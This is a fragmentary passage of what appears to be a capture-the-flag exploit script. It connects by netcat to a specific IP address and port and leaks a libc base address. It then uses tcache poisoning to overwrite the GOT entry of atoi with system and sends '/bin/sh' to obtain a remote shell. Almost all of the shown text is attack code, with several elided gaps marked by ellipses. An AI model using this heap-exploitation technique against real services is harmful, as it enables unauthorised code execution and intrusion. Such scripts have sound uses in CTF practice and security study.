...
_, host, port = 'nc 103.185.52.103 2003'.split()
...
libc.address = a - (libc.sym.main_arena+96)
logx.libc

# tcache poisoining to free_hook
...
malloc(sz) # 5
malloc(sz) # 6
scanf(6, p64(exe.got.atoi))
scanf(2, p64(libc.sym.system))
p.sendline(b'/bin/sh')
